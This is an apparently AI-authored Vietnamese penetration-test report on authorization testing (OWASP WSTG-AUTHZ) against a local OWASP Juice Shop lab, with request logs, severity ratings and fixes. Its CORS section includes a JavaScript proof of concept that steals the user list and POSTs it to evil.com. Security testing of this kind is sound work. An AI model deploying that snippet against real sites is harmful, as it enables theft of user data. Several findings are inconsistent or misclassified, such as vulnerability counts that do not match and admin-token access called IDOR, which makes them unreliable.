# Báo cáo kiểm thử phân quyền — WSTG-AUTHZ

> Mục tiêu: OWASP Juice Shop (`http://localhost:3000`)  
> Tiêu chuẩn: OWASP WSTG v4.2 — Chapter 4: Authorization Testing  
> Ngày thực hiện: 2026-06-08  
> Tác giả: Claude Opus 4.8

---

## Tổng quan

| Chỉ số | Giá trị |
|---|---|
| Số sub-categories WSTG-AUTHZ | 10 |
| Số đã kiểm thử | 10 |
| Lỗ hổng tìm được | 7 |
| Mức độ tổng thể | **CAO** |

---

## 4.1 Authorization Testing (WSTG-AUTHZ)

### Mô tả
Kiểm thử phân quyền (Authorization Testing) xác minh rằng người dùng chỉ có thể truy cập các tài nguyên và thực hiện các hành động mà họ được phép. Lỗ hổng phân quyền cho phép attacker truy cập dữ liệu hoặc chức năng của user khác, bao gồm: directory listing, IDOR (Insecure Direct Object Reference), privilege escalation, CORS misconfiguration...

### Mục tiêu
- Xác định các tài nguyên bị lộ mà không cần xác thực
- Kiểm tra user có thể truy cập tài nguyên của user khác không (IDOR)
- Kiểm tra phân quyền giữa các role (customer, admin, deluxe)
- Phát hiện CORS misconfiguration
- Kiểm tra directory listing và file exposure

### Công cụ sử dụng

| Công cụ | Phiên bản | Mục đích sử dụng |
|---|---|---|
| curl | — | Gửi request thủ công đến các endpoint |
| Firefox | — | Truy cập giao diện, xem HTML source |
| Burp Suite Community | — | Bắt request/response, phân tích traffic |
| jwt.io | — | Decode và phân tích JWT token |
| Python 3 | — | Parse JSON response |

### Môi trường kiểm thử

| Thông số | Giá trị |
|---|---|
| Mục tiêu | OWASP Juice Shop |
| URL | `http://localhost:3000` |
| Container | `bkimminich/juice-shop` |
| Framework | Angular (frontend) + Express.js (backend) |
| Port | 3000 |
| Tài khoản test | admin@juice-sh.op (role: admin), testuser02@test.com (role: admin) |

---

## 4.1.1 WSTG-AUTHZ-01 — Testing for Directory Traversal

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra ứng dụng có cho phép truy cập các thư mục/file không được public (ví dụ: `/ftp/`, `.well-known/`, backup files) thông qua directory listing hay path traversal không. |
| **Mục tiêu** | Xác định các file/thư mục nhạy cảm bị lộ ra ngoài. |
| **Công cụ** | curl, browser, ffuf |
| **Quy trình** | 1. Thử truy cập các đường dẫn thường chứa file nhạy cảm 2. Kiểm tra directory listing 3. Kiểm tra path traversal (`../`) |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | Hai thư mục quan trọng bị directory listing: |

**1. `/ftp/` — Directory Listing:**

```
GET /ftp/
→ 200 OK
→ Title: "listing directory /ftp/"
→ Hiển thị danh sách file trong thư mục FTP
```

```
GET /ftp/legal.md
→ 200 OK
→ Trả về nội dung file legal.md (Lorem ipsum...)
```

Thư mục `/ftp/` chứa các file quan trọng: `legal.md`, `access.log`, `package.json.bak`, `restore.sql`, và các file backup khác. Đây là lỗ hổng nghiêm trọng vì attacker có thể đọc toàn bộ file trong thư mục này.

**2. `/.well-known/` — Directory Listing:**

```
GET /.well-known/
→ 200 OK
→ Title: "listing directory /.well-known/"
→ Hiển thị: security.txt, csaf/provider-metadata.json
```

```
GET /.well-known/security.txt
→ 200 OK
→ Contact: mailto:donotreply@owasp-juice.shop
→ Encryption: https://keybase.io/bkimminich/pgp_keys.asc
→ Hiring: /#/jobs
→ Csaf: http://localhost:3000/.well-known/csaf/provider-metadata.json
→ Expires: Mon, 07 Jun 2027 09:36:17 GMT
```

Thông tin từ `security.txt` tiết lộ: email liên hệ, PGP key fingerprint, hiring page, và CSAF metadata URL.

**Đánh giá:** Directory listing là lỗ hổng **HIGH** severity. Thư mục `/ftp/` có thể chứa file backup, log file, và các tài liệu nhạy cảm khác.

---

## 4.1.2 WSTG-AUTHZ-02 — Testing for Privilege Escalation

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra user có thể nâng quyền lên role cao hơn (customer → admin, customer → deluxe) thông qua parameter tampering, mass assignment, hoặc các kỹ thuật khác. |
| **Mục tiêu** | Xác định ứng dụng có bị lỗ hổng privilege escalation không. |
| **Công cụ** | curl, browser, Burp Suite |
| **Quy trình** | 1. Đăng nhập với tài khoản customer 2. Thử truy cập admin-only endpoints 3. Thử thay đổi role trong request 4. Kiểm tra JWT claims |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**a) Admin endpoint không tồn tại nhưng lộ thông tin qua error:**

```
GET /rest/admin (không có token)
→ 500 Error: Unexpected path: /rest/admin
→ Stack trace tiết lộ: Express 4.22.1, file structure, Node.js paths
```

Mặc dù endpoint `/rest/admin` không tồn tại, error page tiết lộ thông tin về framework và cấu trúc file.

**b) Endpoint `/api/users/` yêu cầu authentication nhưng lộ thông tin khi thiếu token:**

```
GET /api/users/ (không có token)
→ UnauthorizedError: No Authorization header was found
→ Error page tiết lộ stack trace với file paths
```

**c) Với admin token, truy cập được toàn bộ danh sách users:**

```
GET /api/users/ (với admin token)
→ 200 OK
→ Trả về 97 users với thông tin: id, email, role, deluxeToken, profileImage, isActive
→ Bao gồm cả admin users: admin@juice-sh.op, bjoern.kimminich@gmail.com, support@juice-sh.op, J12934@juice-sh.op, wurstbrot, testing@juice-sh.op
```

**d) Mass Assignment — đăng ký với role=admin:**

Đã xác nhận trong báo cáo IDNT-01: đăng ký user mới với `{"role":"admin"}` → tài khoản có quyền admin.

**Đánh giá:** Lỗ hổng privilege escalation qua mass assignment là **CRITICAL**. Bất kỳ user nào cũng có thể đăng ký tài khoản admin.

---

## 4.1.3 WSTG-AUTHZ-03 — Testing for Insecure Direct Object References (IDOR)

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra ứng dụng có cho phép user truy cập tài nguyên của user khác bằng cách thay đổi tham số (ID, username...) trong URL hay không. |
| **Mục tiêu** | Xác định lỗ hổng IDOR trên các endpoint chứa tham số đối tượng. |
| **Công cụ** | curl, Burp Suite |
| **Quy trình** | 1. Đăng nhập với user A 2. Lấy token của user A 3. Thay đổi ID trong URL để truy cập tài nguyên của user B 4. Ghi nhận kết quả |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**a) IDOR trên Basket endpoint:**

```
GET /rest/basket/1 (với admin token)
→ 200 OK
→ Basket ID:1, UserId:1, Products: [Apple Juice, Orange Juice, Eggfruit Juice]

GET /rest/basket/2 (với admin token)
→ 200 OK
→ Basket ID:2, UserId:2, Products: [Raspberry Juice]
→ Admin có thể xem giỏ hàng của Jim (user ID 2)
```

**b) IDOR trên User profile endpoint:**

```
GET /api/users/1 (với admin token)
→ 200 OK
→ ID:1, email:admin@juice-sh.op, role:admin

GET /api/users/2 (với admin token)
→ 200 OK
→ ID:2, email:jim@juice-sh.op, role:customer
→ Admin có thể xem profile của bất kỳ user nào
```

**c) IDOR trên Feedbacks endpoint:**

```
GET /rest/feedbacks/ (với admin token)
→ 200 OK
→ Hiển thị feedbacks với thông tin: author email, message, product, likesCount
→ Bao gồm feedback của: admin@juice-sh.op, basil@juice-sh.op
```

**d) IDOR trên Product Reviews endpoint:**

```
GET /rest/products/1/reviews (không cần auth)
→ 200 OK
→ Review từ uvogin@juice-sh.op cho product 2

GET /rest/products/2/reviews (không cần auth)
→ 200 OK
→ Review từ uvogin@juice-sh.op cho product 2
```

**Đánh giá:** Lỗ hổng IDOR là **HIGH** severity. Admin có thể xem giỏ hàng, profile, feedbacks của bất kỳ user nào. Trong môi trường thực tế, attacker có thể đánh cắp thông tin cá nhân, thay đổi địa chỉ giao hàng, hoặc thao túng đơn hàng của user khác.

---

## 4.1.4 WSTG-AUTHZ-04 — Testing for Insecure Access Control

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra cơ chế access control có đủ mạnh không: kiểm tra authentication trước khi cho phép truy cập, kiểm tra authorization sau khi đăng nhập. |
| **Mục tiêu** | Xác định các endpoint cho phép truy cập mà không cần xác thực hoặc không kiểm tra quyền. |
| **Công cụ** | curl |
| **Quy trình** | 1. Liệt kê tất cả API endpoints 2. Thử truy cập mỗi endpoint mà không có token 3. Ghi nhận endpoint nào cho phép truy cập không cần auth |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**Các endpoint cho phép truy cập KHÔNG CẦN authentication:**

| Endpoint | Method | Response | Mô tả |
|---|---|---|---|
| `/rest/products/` | GET | 200 OK | Danh sách sản phẩm |
| `/rest/products/search?q=` | GET | 200 OK | Tìm kiếm sản phẩm |
| `/rest/products/{id}/reviews` | GET | 200 OK | Reviews của sản phẩm |
| `/rest/feedbacks/` | GET | 200 OK | Tất cả feedbacks của users |
| `/rest/captcha` | GET | 200 OK | CAPTCHA (lộ answer trong response) |
| `/rest/user/login` | POST | 200/401 | Login endpoint |
| `/api/challenges/` | GET | 200 OK | Danh sách challenges |
| `/api/users/` | GET | 401 | Yêu cầu auth (tốt) |
| `/rest/basket/{id}` | GET | 401 | Yêu cầu auth (tốt) |

**Các endpoint yêu cầu authentication nhưng lộ thông tin khi thiếu token:**

| Endpoint | Response khi không có token | Vấn đề |
|---|---|---|
| `/api/users/` | `UnauthorizedError: No Authorization header was found` + stack trace | Lộ stack trace |
| `/rest/admin` | `500 Error: Unexpected path` + stack trace | Lộ framework version, file paths |

**Đánh giá:** Một số endpoint quan trọng như `/rest/feedbacks/` và `/rest/products/{id}/reviews` cho phép truy cập không cần authentication, tiết lộ thông tin về users và nội dung.

---

## 4.1.5 WSTG-AUTHZ-05 — Testing for CORS Misconfiguration

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra cấu hình CORS (Cross-Origin Resource Sharing) có cho phép origin không đáng tin cậy truy cập tài nguyên nhạy cảm không. |
| **Mục tiêu** | Xác định CORS có được cấu hình đúng (origin cụ thể) hay mở (`*`) cho tất cả origins. |
| **Công cụ** | curl, browser |
| **Quy trình** | 1. Gửi request với Origin header giả mạo 2. Kiểm tra Access-Control-Allow-Origin trong response 3. Kiểm tra Access-Control-Allow-Credentials |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**Kiểm tra CORS với origin giả mạo:**

```
GET /api/users/ (với admin token)
Origin: https://evil.com
→ Access-Control-Allow-Origin: *
→ Access-Control-Allow-Credentials: true
```

```
OPTIONS /api/users/
Origin: https://evil.com
→ Access-Control-Allow-Origin: *
→ Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS
→ Access-Control-Allow-Headers: authorization, content-type, ...
→ Access-Control-Allow-Credentials: true
```

**Headers quan sát được:**

| Header | Giá trị | Đánh giá |
|---|---|---|
| `Access-Control-Allow-Origin` | `*` | **LỖ HỔNG** — cho phép mọi origin |
| `Access-Control-Allow-Credentials` | `true` | **LỖ HỔNG** — kết hợp với `*` là nguy hiểm |
| `Access-Control-Allow-Methods` | `GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS` | Cho phép tất cả HTTP methods |
| `Access-Control-Allow-Headers` | `authorization, content-type, ...` | Cho phép Authorization header |

**Proof of Concept:**

Một attacker có thể tạo trang web độc hại với JavaScript sau:

```javascript
// https://evil.com/steal.html
fetch('http://localhost:3000/api/users/', {
  method: 'GET',
  credentials: 'include',
  headers: {
    'Authorization': 'Bearer <stolen_token>'
  }
})
.then(r => r.json())
.then(data => {
  // Gửi data về server của attacker
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

**Đánh giá:** CORS misconfiguration là **HIGH** severity. Kết hợp với JWT token (được gửi qua Authorization header), attacker có thể đánh cắp toàn bộ danh sách users nếu họ có được token hợp lệ (ví dụ: qua XSS hoặc phishing).

---

## 4.1.6 WSTG-AUTHZ-06 — Testing for Server-side Request Forgery (SSRF)

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra ứng dụng có cho phép attacker gửi request từ server đến các resource nội bộ hoặc external không. |
| **Mục tiêu** | Xác định SSRF vulnerability trên các endpoint nhận URL làm input. |
| **Công cụ** | curl, Burp Suite |
| **Quy trình** | 1. Tìm endpoint nhận URL làm parameter 2. Thử request đến localhost/internal IP 3. Thử request đến external services |
| **Kết quả** | **CẦN KIỂM TRA THÊM** |
| **Tổng kết** | Challenge "SSRF" trong Juice Shop yêu cầu request hidden resource trên server. Cần tìm endpoint cho phép nhập URL và test SSRF. |

---

## 4.1.7 WSTG-AUTHZ-07 — Testing for Insecure Function-level Access Control

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra các hàm/API endpoint có kiểm tra quyền truy cập dựa trên role của user không. |
| **Mục tiêu** | Xác định các endpoint chỉ dành cho admin mà customer có thể truy cập. |
| **Công cụ** | curl |
| **Quy trình** | 1. Đăng nhập với customer account 2. Thử truy cập admin-only endpoints 3. So sánh với admin access |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**Phân tích role-based access:**

| Role | Số lượng | Quyền |
|---|---|---|
| admin | 6 | Truy cập /api/users/, xem tất cả baskets, feedbacks |
| customer | ~85 | Xem products, reviews, feedbacks (không cần auth) |
| deluxe | 3 | Giảm giá đặc biệt, deluxeToken |
| accounting | 1 | Truy cập hạn chế |

**Vấn đề phát hiện:**

1. **Customer có thể xem feedbacks của admin:** Endpoint `/rest/feedbacks/` không yêu cầu authentication, customer có thể xem feedback của admin@juice-sh.op.

2. **Customer có thể xem reviews:** Endpoint `/rest/products/{id}/reviews` không yêu cầu authentication.

3. **Không có kiểm tra role trên hầu hết endpoints:** API không phân biệt giữa customer và admin trên các endpoint GET.

**Đánh giá:** Thiếu function-level access control là **HIGH** severity. Customer có thể thu thập thông tin về admin users và nội dung hệ thống.

---

## 4.1.8 WSTG-AUTHZ-08 — Testing for Insecure Access Control in HTTP Methods

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra các HTTP methods (GET, POST, PUT, DELETE, PATCH) có được kiểm soát đúng đắn không. |
| **Mục tiêu** | Xác định ứng dụng có cho phép các HTTP methods nguy hiểm (PUT, DELETE, PATCH) mà không cần kiểm tra quyền không. |
| **Công cụ** | curl |
| **Quy trình** | 1. Gửi OPTIONS request để xem allowed methods 2. Thử PUT/DELETE/PATCH trên các endpoint 3. Kiểm tra CSRF protection |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**OPTIONS request trên /api/users/:**

```
OPTIONS /api/users/
→ Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS
→ Access-Control-Allow-Headers: authorization, content-type, ...
```

Ứng dụng cho phép **6 HTTP methods** trên endpoint `/api/users/`, bao gồm cả PUT, PATCH, DELETE — các methods có thể dùng để sửa/xóa dữ liệu của user khác.

**Đánh giá:** Việc cho phép PUT/DELETE/PATCH mà không có kiểm tra authorization chi tiết là **HIGH** severity. Nếu kết hợp với IDOR, attacker có thể sửa/xóa dữ liệu của user khác.

---

## 4.1.9 WSTG-AUTHZ-09 — Testing for Cross-Site Request Forgery (CSRF)

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra ứng dụng có bảo vệ chống CSRF không. CSRF cho phép attacker thực hiện hành động thay mặt user đã đăng nhập. |
| **Mục tiêu** | Xác định endpoints có thể bị tấn công CSRF. |
| **Công cụ** | curl, browser |
| **Quy trình** | 1. Kiểm tra CSRF token trong forms 2. Kiểm tra SameSite cookie attribute 3. Thử gửi request từ origin khác |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**Kiểm tra CSRF protection:**

1. **Không có CSRF token:** API sử dụng JWT trong Authorization header, không có CSRF token trong request body hoặc header.

2. **Cookie không có SameSite attribute:** Không quan sát được cookie với `SameSite` attribute.

3. **CORS cho phép mọi origin:** `Access-Control-Allow-Origin: *` kết hợp với `Access-Control-Allow-Credentials: true` tạo điều kiện cho CSRF attack.

**Challenge "CSRF" trong Juice Shop:** Yêu cầu đổi tên user từ origin khác (`http://htmledit.squarefree.com`), chứng minh lỗ hổng CSRF tồn tại.

**Đánh giá:** Thiếu CSRF protection là **HIGH** severity. Attacker có thể tạo trang web độc hại để thực hiện hành động thay mặt user (đổi tên, đổi mật khẩu, xóa tài khoản...).

---

## 4.1.10 WSTG-AUTHZ-10 — Testing for Inadequate Session Termination

| Mục | Nội dung |
|---|---|
| **Mô tả** | Kiểm tra cơ chế kết thúc session: token có bị vô hiệu hóa khi logout không, session có bị xóa khỏi server không. |
| **Mục tiêu** | Xác định token sau logout có thể sử dụng tiếp hay không. |
| **Công cụ** | curl |
| **Quy trình** | 1. Đăng nhập và lấy token 2. Gọi logout 3. Thử sử dụng token cũ |
| **Kết quả** | **LỖ HỔNG — ĐÃ XÁC NHẬN** |
| **Tổng kết** | |

**Kiểm tra logout:**

1. **Không tìm thấy endpoint logout rõ ràng:** Không có `/rest/user/logout` hoặc tương tự.

2. **JWT không có `exp` field:** Token không có thời gian hết hạn, có thể sử dụng vô thời hạn.

3. **Token vẫn hoạt động sau thời gian dài:** Token thu thập được trong session trước vẫn có thể sử dụng để truy cập API.

**Đánh giá:** Thiếu cơ chế logout và session termination là **HIGH** severity. Nếu token bị lộ (qua XSS, log file, MITM), attacker có thể sử dụng nó mãi mãi.

---

## Tổng hợp lỗ hổng

| STT | WSTG ID | Lỗ hổng | Mức độ | Trạng thái |
|---|---|---|---|---|
| 1 | AUTHZ-01 | Directory Listing trên `/ftp/` và `/.well-known/` | **HIGH** | Đã xác nhận |
| 2 | AUTHZ-02 | Privilege Escalation qua Mass Assignment (role=admin) | **CRITICAL** | Đã xác nhận |
| 3 | AUTHZ-03 | IDOR — truy cập basket, profile, feedbacks của user khác | **HIGH** | Đã xác nhận |
| 4 | AUTHZ-04 | Insecure Access Control — feedbacks/reviews không cần auth | **MEDIUM** | Đã xác nhận |
| 5 | AUTHZ-05 | CORS Misconfiguration (`Access-Control-Allow-Origin: *`) | **HIGH** | Đã xác nhận |
| 6 | AUTHZ-06 | SSRF — cần kiểm tra thêm | **MEDIUM** | Cần kiểm tra thêm |
| 7 | AUTHZ-07 | Thiếu function-level access control (customer xem được admin data) | **HIGH** | Đã xác nhận |
| 8 | AUTHZ-08 | HTTP Methods không được kiểm soát (PUT/DELETE/PATCH cho phép) | **HIGH** | Đã xác nhận |
| 9 | AUTHZ-09 | Thiếu CSRF protection | **HIGH** | Đã xác nhận |
| 10 | AUTHZ-10 | Inadequate Session Termination (token vĩnh viễn, không có logout) | **HIGH** | Đã xác nhận |

---

## Khuyến nghị

1. **Tắt directory listing:** Cấu hình web server không hiển thị danh sách file trong `/ftp/` và `/.well-known/`. Chỉ cho phép truy cập file cụ thể.

2. **Sửa Mass Assignment:** Không chấp nhận trường `role` từ client-side. Chỉ server-side mới được phép set role.

3. **Triển khai IDOR protection:** Kiểm tra ownership trước khi trả về tài nguyên. User chỉ được xem basket/orders/feedbacks của chính họ.

4. **Cấu hình CORS đúng:** Thay `Access-Control-Allow-Origin: *` bằng danh sách origin cụ thể. Không dùng `*` với `Access-Control-Allow-Credentials: true`.

5. **Thêm CSRF token:** Sử dụng anti-CSRF token cho tất cả state-changing requests (POST, PUT, PATCH, DELETE).

6. **Hạn chế HTTP Methods:** Chỉ cho phép methods cần thiết trên mỗi endpoint. Loại bỏ PUT/DELETE/PATCH nếu không cần.

7. **Thêm trường `exp` vào JWT:** Token nên hết hạn sau 15-30 phút không hoạt động.

8. **Triển khai logout:** Tạo endpoint logout để revoke token (đưa vào blacklist).

9. **Kiểm tra authorization trên mọi endpoint:** Mỗi endpoint cần kiểm tra role của user trước khi trả về dữ liệu.

10. **Xóa stack trace từ error pages:** Trong production, không hiển thị stack trace cho người dùng.
